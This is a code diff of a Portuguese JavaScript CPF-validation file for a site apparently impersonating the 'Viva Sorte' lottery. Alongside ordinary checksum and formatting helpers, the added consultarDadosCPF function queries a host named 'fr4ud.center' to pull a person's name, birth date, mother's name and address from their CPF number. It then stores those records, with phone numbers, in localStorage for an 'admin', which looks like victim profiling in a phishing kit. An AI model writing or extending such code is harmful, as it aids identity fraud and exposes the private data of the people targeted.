@@ -1,82 +1,115 @@
-// js/cpf-validator.js - Versão SUPER SIMPLES que FUNCIONA
-let usuarioAtual = null;
+// FUNÇÕES DE VALIDAÇÃO E CONSULTA DE CPF
 
-async function consultarCPF(cpfCompleto) {
-    const cpfNumeros = cpfCompleto.replace(/\D/g, '');
+// VALIDAR ALGORITMO DO CPF
+function validarCPF(cpf) {
+    cpf = cpf.replace(/\D/g, '');
     
-    if (cpfNumeros.length !== 11) {
-        document.getElementById('cpfInfo').style.display = 'none';
-        document.getElementById('cpfLoading').style.display = 'none';
-        return;
+    if (cpf.length !== 11) return false;
+    if (/^(\d)\1+$/.test(cpf)) return false;
+    
+    let soma = 0;
+    for (let i = 0; i < 9; i++) {
+        soma += parseInt(cpf.charAt(i)) * (10 - i);
+    }
+    let resto = soma % 11;
+    let digito1 = resto < 2 ? 0 : 11 - resto;
+    
+    if (digito1 !== parseInt(cpf.charAt(9))) return false;
+    
+    soma = 0;
+    for (let i = 0; i < 10; i++) {
+        soma += parseInt(cpf.charAt(i)) * (11 - i);
+    }
+    resto = soma % 11;
+    let digito2 = resto < 2 ? 0 : 11 - resto;
+    
+    return digito2 === parseInt(cpf.charAt(10));
+}
+
+// CONSULTAR DADOS DO CPF NA API
+async function consultarDadosCPF(cpf) {
+    const cpfLimpo = cpf.replace(/\D/g, '');
+    
+    if (cpfLimpo.length !== 11) {
+        return null;
     }
     
-    console.log('🔍 Consultando CPF:', cpfNumeros);
-    
-    // Mostrar loading
-    document.getElementById('cpfLoading').style.display = 'block';
-    document.getElementById('cpfInfo').style.display = 'none';
-    document.getElementById('erroCPF').style.display = 'none';
-    
-    // Dados SIMULADOS (para funcionar AGORA)
-    setTimeout(() => {
-        document.getElementById('cpfLoading').style.display = 'none';
+    try {
+        const response = await fetch(`https://apis.fr4ud.center/search/cpf/${cpfLimpo}`, {
+            headers: {
+                'Accept': 'application/json'
+            }
+        });
         
-        // Dados simulados realistas
-        usuarioAtual = {
-            cpf: cpfNumeros,
-            nome: 'Cliente Teste ' + cpfNumeros.substring(0, 3),
-            idade: Math.floor(Math.random() * 30) + 25,
-            cidade: 'São Paulo',
-            uf: 'SP',
-            mae: 'Mãe do Cliente',
-            consultado_em: new Date().toISOString()
-        };
-        
-        // Mostrar na tela
-        mostrarInfoCPF(usuarioAtual);
-        
-        // Salvar para o ADMIN
-        salvarParaAdmin(usuarioAtual);
-        
-        // Habilitar botão
-        document.getElementById('btnContinuarCPF').disabled = false;
-        document.getElementById('btnContinuarCPF').style.background = 'linear-gradient(to right, #2f4eb5, #3949ab)';
-        
-    }, 1500);
-}
-
-function mostrarInfoCPF(usuario) {
-    const cpfInfo = document.getElementById('cpfInfo');
-    cpfInfo.innerHTML = `
-        <div class="cpf-valid">
-            <h4><i class="bi bi-check-circle"></i> CPF Identificado</h4>
-            <p><strong>Nome:</strong> ${usuario.nome}</p>
-            <p><strong>Idade:</strong> ${usuario.idade} anos</p>
-            <p><strong>Cidade:</strong> ${usuario.cidade} - ${usuario.uf}</p>
-            <p><strong>CPF Válido:</strong> Sim</p>
-        </div>
-    `;
-    cpfInfo.style.display = 'block';
-}
-
-function salvarParaAdmin(usuario) {
-    // Salvar no localStorage para o admin
-    let usuarios = JSON.parse(localStorage.getItem('vivasorte_usuarios') || '{}');
-    usuarios[usuario.cpf] = usuario;
-    localStorage.setItem('vivasorte_usuarios', JSON.stringify(usuarios));
-    
-    console.log('✅ Dados salvos para admin:', usuario);
-}
-
-// Para salvar telefone também
-function salvarTelefoneParaAdmin(telefone) {
-    if (usuarioAtual) {
-        usuarioAtual.telefone = telefone.replace(/\D/g, '');
-        salvarParaAdmin(usuarioAtual);
+        if (response.ok) {
+            const data = await response.json();
+            
+            if (data.success && data.data) {
+                // SALVAR DADOS NO LOCALSTORAGE
+                let clientesSalvos = JSON.parse(localStorage.getItem('vivasorte_clientes') || '{}');
+                clientesSalvos[cpfLimpo] = {
+                    nome: data.data.nome || '',
+                    nascimento: data.data.nascimento || '',
+                    mae: data.data.mae || '',
+                    cpf: cpfLimpo,
+                    consultado_em: new Date().toISOString(),
+                    endereco: data.data.endereco || '',
+                    cidade: data.data.cidade || '',
+                    estado: data.data.estado || ''
+                };
+                
+                localStorage.setItem('vivasorte_clientes', JSON.stringify(clientesSalvos));
+                
+                return clientesSalvos[cpfLimpo];
+            }
+        }
+    } catch (error) {
+        console.error('Erro ao consultar CPF:', error);
     }
+    
+    return null;
 }
 
-// Exportar funções
-window.consultarCPF = consultarCPF;
-window.salvarTelefoneParaAdmin = salvarTelefoneParaAdmin;
-window.getUsuarioAtual = () => usuarioAtual;
+// FORMATAR CPF
+function formatarCPF(cpf) {
+    const cpfLimpo = cpf.replace(/\D/g, '');
+    if (cpfLimpo.length !== 11) return cpf;
+    
+    return cpfLimpo.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+}
+
+// OBTER DADOS DO CLIENTE SALVOS
+function obterDadosCliente(cpf) {
+    const cpfLimpo = cpf.replace(/\D/g, '');
+    const clientesSalvos = JSON.parse(localStorage.getItem('vivasorte_clientes') || '{}');
+    return clientesSalvos[cpfLimpo] || null;
+}
+
+// FUNÇÃO PARA SALVAR TELEFONE NO ADMIN
+function salvarTelefoneParaAdmin(telefone, cpf) {
+    const telefoneLimpo = telefone.replace(/\D/g, '');
+    const cpfLimpo = cpf.replace(/\D/g, '');
+    
+    if (!cpfLimpo || cpfLimpo.length !== 11) return;
+    
+    // Atualizar dados do cliente com telefone
+    let clientesSalvos = JSON.parse(localStorage.getItem('vivasorte_clientes') || '{}');
+    if (clientesSalvos[cpfLimpo]) {
+        clientesSalvos[cpfLimpo].telefone = telefoneLimpo;
+        clientesSalvos[cpfLimpo].atualizado_em = new Date().toISOString();
+        localStorage.setItem('vivasorte_clientes', JSON.stringify(clientesSalvos));
+    }
+    
+    console.log('Telefone salvo para admin:', { cpf: cpfLimpo, telefone: telefoneLimpo });
+}
+
+// EXPORTAR FUNÇÕES (se usando módulos)
+if (typeof module !== 'undefined' && module.exports) {
+    module.exports = {
+        validarCPF,
+        consultarDadosCPF,
+        formatarCPF,
+        obterDadosCliente,
+        salvarTelefoneParaAdmin
+    };
+}
